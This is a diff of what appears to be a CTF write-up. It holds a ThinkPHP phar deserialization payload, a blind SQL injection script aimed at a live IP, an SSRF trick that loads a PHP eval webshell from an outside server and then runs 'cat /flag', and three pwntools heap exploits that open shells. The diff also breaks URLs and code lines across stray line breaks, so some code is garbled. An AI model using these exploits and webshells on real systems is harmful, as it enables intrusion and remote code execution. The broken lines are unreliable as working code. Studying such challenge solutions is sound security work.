@@ -87,11 +87,6 @@ namespace {
     $phar->setMetadata($payload);
     $phar->addFromString('test.txt', 'Hello world!');
 }
-```
-
-
-
-```
 <?php
 namespace think;
 abstract class Model{
@@ -165,38 +160,30 @@ $phar->addFromString("test.txt", "test"); //添加要压缩的文件
 $phar->stopBuffering();
 
 echo base64_encode(file_get_contents("phar.phar"));
-```
-
-
-
-```
 get /index.php/index/index/hello?huha[]=cat+/y0u_f0und_It
 pos 
 world=hello%3dPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%25%32%62DQrGAQAAAQAAABEAAAABAAAAAACQAQAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czo4OiJjYWxjLmV4ZSI7aToxO3M6NDoiY2FsYyI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjU6ImV0aGFuIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQgAAAB0ZXN0LnR4dAQAAAC/3KFhBAAAAAx%25%32%62f9ikAQAAAAAAAHRlc3QgU3Sk6UFHPeqihUvXyWZJEhWeJwIAAABHQk1C%26a%3dphar://hello.txt
-```
-
-
-
-```
 import requests
 import time
 
 s='abcdefghijklmnopqrstuvwxyz1234567890{}_-[]()!~QWERTYUIOPASDFGHJKLZXCVBNM'
 
-url='http://47.108.195.119:6244/Core/Program/Ant_Rponse.php?actions=ReviewsAdd&lgid=1&type=Add'
+url='http://47.108.195.119:
+6244/Core/Program/Ant_Rponse.php?actions=ReviewsAdd&lgid=1&type=Add'
 
 datas={'msg_rating':'4','msg_name':'okami okami','msg_email':'okami@okami.com','msg_content':'1111','msg_pid':'2','msg_flag':'p','languageID':'1'}
 
 payload="1'+(if((ascii(substr((select(user_name)from(sc_user),{}))={}),sleep(3),0))+'1"
 
-#data='0b7752df93de693bdab0060746e38165'
-#admin888
-#admin888
+    #data='0b7752df93de693bdab0060746e38165'
+    #admin888
+    #admin888
 data=''
 for i in range(1,40):
  for a in s:
   payloads=payload.format(str(i),str(ord(a)))
-  headers={'X-Forwarded-For':payloads}
+  headers={'X-Forwarded-For':
+payloads}
   print(headers)
   start = int(time.time())
   r=requests.post(url,data=datas,headers=headers)
@@ -207,53 +194,20 @@ for i in range(1,40):
    break
   else:
    print(r.text)
-```
-
-
-
-```
 strpos($dname[2],'sem-cms.cn') !== false
-```
-
-
-
-```
 http://sem-cms.cn@ip/
-```
-
-
-
-```
 <?php
 echo '<?php eval($_REQUEST[1]);var_dump("okk!");?>';
 ?>
-```
-
-
-
-```
-http://47.108.195.119:6244/CxWsbN_AR4/Ant_Curl.php?url=http://sem-cms.cn@101.35.90.76/okami.php
-```
-
-
-
-```
-http://47.108.195.119:6244/Soft/Zip/okami.php?1=system(%22cat%20/flag%22);
-```
-
-
-
-```
+http://47.108.195.119:
+6244/CxWsbN_AR4/Ant_Curl.php?url=http://sem-cms.cn@101.35.90.76/okami.php
+http://47.108.195.119:
+6244/Soft/Zip/okami.php?1=system(%22cat%20/flag%22);
 python3 crc32.py reverse 0xA430239A th1s_I
 python3 crc32.py reverse 0xF81ABECD s_Y0ur
 python3 crc32.py reverse 0x2A75B14E _pa33w
 python3 crc32.py reverse 0x2D2C423C 0rd_We
 python3 crc32.py reverse 0xD9E12803 1c0m3e
-```
-
-
-
-```
 from functools import reduce
 
 def Tuppers_Self_Referential_Formula():
@@ -275,17 +229,13 @@ def Tuppers_Self_Referential_Formula():
 
 if __name__ == '__main__':
     Tuppers_Self_Referential_Formula()
-```
-
-
-
-```
-# -*- coding:UTF-8 -*-
+# -*- coding:
+UTF-8 -*-
 from pwn import *
 from LibcSearcher import *
-#context.log_level = 'debug'
+    #context.log_level = 'debug'
 
-#context
+    #context
 context.arch = 'amd64'
 SigreturnFrame(kernel = 'amd64')
 
@@ -309,10 +259,14 @@ ru = lambda s:p.recvuntil(s)
 rl = lambda :p.recvline()
 sa = lambda a,s:p.sendafter(a,s)
 sla = lambda a,s:p.sendlineafter(a,s)
-uu32    = lambda data   :u32(data.ljust(4, ' '))
-uu64    = lambda data   :u64(data.ljust(8, ' '))
-u64Leakbase = lambda offset :u64(ru("x7f")[-6: ] + '  ') - offset
-u32Leakbase = lambda offset :u32(ru("xf7")[-4: ]) - offset
+uu32    = lambda data   :
+u32(data.ljust(4, ' '))
+uu64    = lambda data   :
+u64(data.ljust(8, ' '))
+u64Leakbase = lambda offset :
+u64(ru("x7f")[-6: ] + '  ') - offset
+u32Leakbase = lambda offset :
+u32(ru("xf7")[-4: ]) - offset
 it      = lambda                    :p.interactive()
 
 def dbg():
@@ -330,7 +284,7 @@ def first():
 
 first()
 payload = "Can:%11$pELF:%12$p"
-#dbg()
+    #dbg()
 p.sendline(payload)
 ru('Can:0x')
 canary = int(rc(16),16)
@@ -347,18 +301,14 @@ payload += p64(elf_base+0xa8c)
 p.sendline(payload)
 p.interactive()
 
-#d0g3{b992a129ef160e6581fc255f87c28d8f}
-```
-
-
-
-```
-# -*- coding:UTF-8 -*-
+    #d0g3{b992a129ef160e6581fc255f87c28d8f}
+# -*- coding:
+UTF-8 -*-
 from pwn import *
 from LibcSearcher import *
-#context.log_level = 'debug'
+    #context.log_level = 'debug'
 
-#context
+    #context
 context.arch = 'amd64'
 SigreturnFrame(kernel = 'amd64')
 
@@ -385,10 +335,14 @@ ru = lambda s:p.recvuntil(s)
 rl = lambda :p.recvline()
 sa = lambda a,s:p.sendafter(a,s)
 sla = lambda a,s:p.sendlineafter(a,s)
-uu32    = lambda data   :u32(data.ljust(4, ' '))
-uu64    = lambda data   :u64(data.ljust(8, ' '))
-u64Leakbase = lambda offset :u64(ru("x7f")[-6: ] + '  ') - offset
-u32Leakbase = lambda offset :u32(ru("xf7")[-4: ]) - offset
+uu32    = lambda data   :
+u32(data.ljust(4, ' '))
+uu64    = lambda data   :
+u64(data.ljust(8, ' '))
+u64Leakbase = lambda offset :
+u64(ru("x7f")[-6: ] + '  ') - offset
+u32Leakbase = lambda offset :
+u32(ru("xf7")[-4: ]) - offset
 it      = lambda                    :p.interactive()
 
 menu = "> "
@@ -450,7 +404,7 @@ for i in range(0x7):
 
 delete(7)
 edit(8,"PIG007NB"*(0x70/8)+p64(0x100+0x80))
-#dbg()
+    #dbg()
 delete(9)
 
 for i in range(0x7):
@@ -460,7 +414,7 @@ add(0,0xf8)
 add(0,0x28)
 add(1,0x28)
 add(2,0x28)
-#dbg()
+    #dbg()
 show(0)
 
 libc_base = u64Leakbase(0x3afca0)
@@ -474,7 +428,7 @@ lg("free_hook",free_hook)
 delete(2)
 delete(1)
 delete(0)
-#dbg()
+    #dbg()
 edit(8,p64(free_hook))
 add(0,0x28)
 add(1,0x28)
@@ -483,16 +437,12 @@ edit(1,p64(system_addr))
 delete(8)
 it()
 
-#d0g3{dc8e8748ce4a44bfcaf268526cd5b084}
-```
-
-
-
-```
-# -*- coding:UTF-8 -*-
+    #d0g3{dc8e8748ce4a44bfcaf268526cd5b084}
+# -*- coding:
+UTF-8 -*-
 from pwn import *
 from LibcSearcher import *
-#context.log_level = 'debug'
+    #context.log_level = 'debug'
 
 context.arch = 'amd64'
 SigreturnFrame(kernel = 'amd64')
@@ -516,10 +466,14 @@ ru = lambda s:p.recvuntil(s)
 rl = lambda :p.recvline()
 sa = lambda a,s:p.sendafter(a,s)
 sla = lambda a,s:p.sendlineafter(a,s)
-uu32    = lambda data   :u32(data.ljust(4, ' '))
-uu64    = lambda data   :u64(data.ljust(8, ' '))
-u64Leakbase = lambda offset :u64(ru("x7f")[-6: ] + '  ') - offset
-u32Leakbase = lambda offset :u32(ru("xf7")[-4: ]) - offset
+uu32    = lambda data   :
+u32(data.ljust(4, ' '))
+uu64    = lambda data   :
+u64(data.ljust(8, ' '))
+u64Leakbase = lambda offset :
+u64(ru("x7f")[-6: ] + '  ') - offset
+u32Leakbase = lambda offset :
+u32(ru("xf7")[-4: ]) - offset
 it      = lambda                    :p.interactive()
 
 menu = "Your choice : "
@@ -558,37 +512,37 @@ ru('0x')
 heap_base = int(rc(12),16) - 0x10
 lg("heap_base",heap_base)
 
-#change top_chunk size
+    #change top_chunk size
 add(0x28,'PIG007NB')
 edit(0x30,'PIG007NB'*(0x28/8)+p64(0x0fb1))
 
-#set top_chunk into unsortedbin
+    #set top_chunk into unsortedbin
 add(0xff8,'PIG007NB')
 
 add(0x48,'PIG007NB')
-#dbg()
+    #dbg()
 show()
 libc_base = u64Leakbase(0x10 + 1640 + libc.sym['__malloc_hook'])
-#global_max_fast = libc_base + libc.sym['global_max_fast']
+    #global_max_fast = libc_base + libc.sym['global_max_fast']
 main_arena_addr = libc_base + libc.sym['__malloc_hook'] + 0x10
 _IO_list_all_addr = libc_base + libc.sym['_IO_list_all']
 system_addr = libc_base + libc.sym['system']
-#lg("global_max_fast",global_max_fast)
+    #lg("global_max_fast",global_max_fast)
 lg("libc_base",libc_base)
 lg("main_arena_addr",main_arena_addr)
 lg("_IO_list_all_addr",_IO_list_all_addr)
 lg("system_addr",system_addr)
 
-#set into 0x60 smallBin
+    #set into 0x60 smallBin
 fake_IO_all_list = '/bin/shx00'.ljust(8,'x00')+p64(0x60)
 
-#unsorted bin attack
+    #unsorted bin attack
 fake_IO_all_list += p64(0)+p64(_IO_list_all_addr-0x10)
 
 #IO_write_ptr>IO_write_base
 fake_IO_all_list += p64(0)+p64(1)
 
-#mode=0
+    #mode=0
 fake_IO_all_list = fake_IO_all_list.ljust(0xc0,'x00')
 
 payload = 'PIG007NB'*(0x40/8)
@@ -597,13 +551,13 @@ payload += p64(0)*3+p64(heap_base + 0x178)
 payload += 'PIG007NB'*(0x10/8)
 payload += p64(system_addr)
 
-#dbg()
+    #dbg()
 edit(len(payload),payload)
 ru(": ")
 sl('1')
 it()
 
-#d0g3{0fd0b03b98418bb30c7c96b2b6ba9347}
+    #d0g3{0fd0b03b98418bb30c7c96b2b6ba9347}
 ```
 
 
